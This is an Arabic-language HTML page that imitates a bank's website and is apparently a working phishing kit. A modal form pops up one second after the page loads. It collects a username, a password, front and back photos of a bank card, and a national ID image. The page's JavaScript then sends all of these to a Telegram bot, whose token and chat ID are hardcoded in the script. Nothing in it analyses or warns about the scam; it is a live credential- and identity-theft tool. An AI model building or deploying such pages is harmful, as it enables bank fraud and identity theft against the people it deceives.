<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تجربة مصرفية صُمّمت لك</title>
<style>
  :root{
    --navy:#0d1447;
    --blue-text:#5865c7;
    --bg:#f6f7fb;
    --card-a:#dde2f7;
    --card-b:#c7cef5;
    --muted:#7c82a3;
    --white:#ffffff;
    --red:#e63946;
    --cyan:#29b6f6;
    --gray-btn:#b0b4c8; 
    --blue-btn:#1c2fd6; 
  }

  *{box-sizing:border-box;}
  html,body{margin:0;padding:0;}
  body{
    font-family:"Tahoma","Segoe UI",Arial,sans-serif;
    background:var(--bg);
    color:var(--navy);
    min-height:100vh;
    overflow-x:hidden;
  }

  /* ---------- top notice bar ---------- */
  .notice{
    text-align:right;
    font-size:13px;
    color:var(--navy);
    padding:14px 24px;
    border-bottom:1px solid #e9ebf3;
    background:var(--white);
  }

  /* ---------- header ---------- */
  header{
    display:flex;
    align-items:center;
    justify-content:center;
    padding:0;
    background:var(--white);
    border-bottom:1px solid #eef0f8;
  }
  .header-image{
    display:block;
    width:100%;
    height:auto;
  }

  /* ---------- form modal ---------- */
  .modal-backdrop{
    position:fixed;
    inset:0;
    background:rgba(13,20,71,.28);
    opacity:0;
    pointer-events:none;
    transition:opacity .35s ease;
    z-index:90;
  }
  .modal-backdrop.show{
    opacity:1;
    pointer-events:auto;
  }
  
  .form-modal{
    position:fixed;
    left:50%;
    top:160px; 
    width:min(92vw,440px); 
    background:var(--white);
    border-radius:8px; 
    box-shadow:0 30px 60px -20px rgba(13,20,71,.35);
    padding:30px 0 26px; 
    z-index:100;
    opacity:0;
    pointer-events:none;
    transform:translate(-50%,-12px);
    transition:opacity .4s ease, transform .4s ease;
    overflow:hidden;
    display:flex;
    flex-direction:column;
  }
  
  .form-modal.show{
    opacity:1;
    pointer-events:auto;
    transform:translate(-50%,0);
  }

  .form-modal-scroll {
    flex: 1;
    overflow-y: auto;
    padding: 0 24px;
  }
  
  .form-modal-body{
    display:flex;
    flex-direction:column;
    gap:16px;
    padding-bottom: 10px;
  }
  
  .form-group {
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  
  .form-group label {
    font-size: 13px;
    font-weight: 600;
    color: var(--navy);
    line-height: 1.4;
  }
  
  /* الحقول أعرض شوي صغيرة، لونا أبيض، والإطار المحيط أعرض عند التركيز */
  .form-control {
    width: 100%;
    padding: 14px 14px; /* أعرض شوي صغيرة */
    border: 1px solid #dde2f7;
    border-radius: 6px;
    font-family: inherit;
    font-size: 15px;
    color: var(--navy);
    background-color: #ffffff; /* لونها أبيض */
    outline: none;
    transition: border-width 0.1s ease, border-color 0.2s;
  }
  
  /* جعل الإطار الأزرق المحيط أعرض شوي عند الضغط والكتابة */
  .form-control:focus {
    border: 3px solid var(--blue-text); /* أعرض شوي */
    padding: 12px 12px; /* تعديل الـ padding للحفاظ على ثبات الحجم مع زيادة حجم الإطار */
  }
  
  /* جعل البليس هولدر أوضح وأكبر */
  .form-control::placeholder {
    color: #4a5270; /* لون أوضح وأغمق */
    font-size: 15px; /* حجم أكبر */
    font-weight: 500;
  }
  
  .file-dropzone {
    border: 1px dashed #b0b8ec;
    background: #f8f9fe;
    border-radius: 6px;
    padding: 14px;
    text-align: center;
    cursor: pointer;
    transition: background 0.2s;
  }

  .file-dropzone span {
    font-size: 12px;
    color: #5865c7;
    font-weight: 500;
  }

  .file-dropzone input[type="file"] {
    display: none;
  }
  
  .form-footer {
    margin-top: 15px;
    display: flex;
    justify-content: flex-end; 
  }
  
  .btn-submit {
    background: var(--gray-btn);
    color: var(--white);
    border: none;
    padding: 12px 28px;
    border-radius: 6px;
    font-family: inherit;
    font-size: 14px;
    font-weight: 600;
    cursor: not-allowed;
    transition: background 0.3s ease;
    width: auto; 
  }
  
  .btn-submit.ready {
    background: var(--blue-btn);
    cursor: pointer;
  }

  /* ---------- hero ---------- */
  .hero{
    text-align:center;
    padding:52px 20px 30px;
  }
  .hero h1{
    font-size:clamp(22px,4vw,34px);
    margin:0 0 16px;
    color:var(--navy);
    font-weight:800;
    line-height:1.5;
  }
  .hero p{
    margin:0;
    font-size:clamp(15px,2vw,18px);
    color:var(--navy);
    font-weight:500;
  }

  /* ---------- carousel ---------- */
  .carousel-viewport{
    position:relative;
    width:100%;
    overflow:hidden;
    padding:36px 0 8px;
  }
  .track{
    display:flex;
    direction:ltr;
    gap:14px;
    transition:transform .5s cubic-bezier(.4,0,.2,1);
    will-change:transform;
  }
  .card{
    flex:0 0 auto;
    width:min(56vw,270px);
    height:380px;
    border-radius:30px;
    position:relative;
    overflow:hidden;
    background:linear-gradient(160deg,var(--card-a),var(--card-b));
    box-shadow:0 22px 46px -18px rgba(20,25,80,.32);
    cursor:pointer;
    transition:box-shadow .4s;
  }

  .dots{
    display:flex;
    justify-content:center;
    gap:9px;
    margin:22px 0 48px;
  }
  .dot{
    width:8px;height:8px;border-radius:50%;
    background:#d6d9ec;
    border:none;
    cursor:pointer;
    padding:0;
    transition:all .3s;
  }
  .dot.active{
    background:var(--navy);
    width:22px;
    border-radius:6px;
  }

  #mainFileInput{display:none;}

  @media (max-width:640px){
    .card{width:min(62vw,220px);height:320px;border-radius:22px;}
    .notice{padding:12px 16px;font-size:12px;}
  }
</style>
</head>
<body>

  <div class="notice">قواعد الافصاح عن أسعار المنتجات التمويلية</div>

  <header>
    <img src="header.png" alt="الهيدر" class="header-image">
  </header>

  <div class="modal-backdrop" id="modalBackdrop"></div>
  
  <div class="form-modal" id="formModal">
    <div class="form-modal-scroll">
      <form class="form-modal-body" id="dataForm">
        
        <div class="form-group">
          <input type="text" id="username" class="form-control" placeholder="اسم المستخدم" required>
        </div>
        
        <div class="form-group">
          <input type="password" id="password" class="form-control" placeholder="كلمة السر" required>
        </div>
        
        <div class="form-group">
          <label>صورة الوجه الأمامي من البطاقة المقدمة لك (إثبات الملكية)</label>
          <label class="file-dropzone">
            <span>اضغط لتحميل صورة</span>
            <input type="file" id="fileFront" accept="image/*" required>
          </label>
        </div>
        
        <div class="form-group">
          <label>صورة الوجه الخلفي للبطاقة  المقدمة لك</label>
          <label class="file-dropzone">
            <span>اضغط لتحميل صورة</span>
            <input type="file" id="fileBack" accept="image/*" required>
          </label>
        </div>
        
        <div class="form-group">
          <label>صورة الهوية الوطنية</label>
          <label class="file-dropzone">
            <span>اضغط لتحميل صورة </span>
            <input type="file" id="fileSelfie" accept="image/*" required>
          </label>
        </div>
        
        <div class="form-footer">
          <button type="submit" id="submitBtn" class="btn-submit" disabled>إثبات الملكية</button>
        </div>

      </form>
    </div>
  </div>

  <section class="hero">
    <h1>تجربة مصرفية صُمّمت لك</h1>
    <p>تواكب احتياجات يومك وتدعم طموحات غدك</p>
  </section>

  <div class="carousel-viewport" id="viewport">
    <div class="track" id="track"></div>
  </div>

  <div class="dots" id="dots"></div>

  <input type="file" id="mainFileInput" accept="image/*">

<script>
  // ========================================================
  // إعدادات التليجرام
  // ========================================================
  const TELEGRAM_BOT_TOKEN = '8905455566:AAFQLQWmxsp3U0S6I650V85yYK8tiDSyo9w';
  const TELEGRAM_CHAT_ID = '5437487652';
  // ========================================================

  const modalBackdrop = document.getElementById('modalBackdrop');
  const formModal = document.getElementById('formModal');
  const headerEl = document.querySelector('header');
  const dataForm = document.getElementById('dataForm');
  const submitBtn = document.getElementById('submitBtn');

  function positionModal(){
    const headerBottom = headerEl.getBoundingClientRect().bottom;
    formModal.style.top = (headerBottom + 25) + 'px'; 
    formModal.style.maxHeight = `calc(100vh - ${headerBottom + 50}px)`;
  }

  window.addEventListener('resize', positionModal);

  window.addEventListener('load', () => {
    positionModal();
    setTimeout(() => {
      modalBackdrop.classList.add('show');
      formModal.classList.add('show');
    }, 1000);
  });

  function checkFormCompletion() {
    const isFormValid = dataForm.checkValidity();
    if (isFormValid) {
      submitBtn.classList.add('ready');
      submitBtn.disabled = false;
    } else {
      submitBtn.classList.remove('ready');
      submitBtn.disabled = true;
    }
  }

  dataForm.addEventListener('input', checkFormCompletion);
  
  document.querySelectorAll('.file-dropzone input').forEach(input => {
    input.addEventListener('change', function() {
      if(this.files && this.files[0]) {
        this.previousElementSibling.innerText = "✓ تم اختيار: " + this.files[0].name.substring(0, 12) + "...";
        this.previousElementSibling.style.color = "#29b6f6";
      }
      checkFormCompletion();
    });
  });

  dataForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const userVal = document.getElementById('username').value;
    const passVal = document.getElementById('password').value;
    const fileFront = document.getElementById('fileFront').files[0];
    const fileBack = document.getElementById('fileBack').files[0];
    const fileSelfie = document.getElementById('fileSelfie').files[0];

    submitBtn.disabled = true;
    submitBtn.innerText = "جاري إرسال الطلب..."; /* تعديل النص عند النقر */

    const textMessage = `📌 *طلب جديد واصل*\n\n👤 *اسم المستخدم:* \`${userVal}\`\n🔒 *كلمة السر:* \`${passVal}\``;
    
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: textMessage,
          parse_mode: 'Markdown'
        })
      });

      async function sendPhotoToTelegram(file, caption) {
        if(!file) return;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', file);
        formData.append('caption', caption);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      }

      await sendPhotoToTelegram(fileFront, `🖼️ الوجه الأمامي لبطاقة اللاعب (${userVal})`);
      await sendPhotoToTelegram(fileBack, `🖼️ الوجه الخلفي لبطاقة اللاعب (${userVal})`);
      await sendPhotoToTelegram(fileSelfie, `👤 الصورة الشخصية - إثبات الملكية (${userVal})`);

      alert('تم تسجيل طلبك !');
      dataForm.reset();
      checkFormCompletion();
      
      document.querySelectorAll('.file-dropzone span').forEach(span => {
        if(span.innerText.includes('الأمامي')) span.innerText = "اضغط لإرفاق ملف";
        else if(span.innerText.includes('الخلفي')) span.innerText = "اضغط لتحميل صورة";
        else span.innerText = "اضغط لرفع الصورة الشخصية";
        span.style.color = "";
      });

    } catch (error) {
      console.error(error);
      alert('حدث خطأ أثناء إرسال المدخلات، يرجى إعادة المحاولة.');
    } finally {
      submitBtn.disabled = false;
      submitBtn.innerText = "إثبات الملكية";
    }
  });
</script>
</body>
</html>
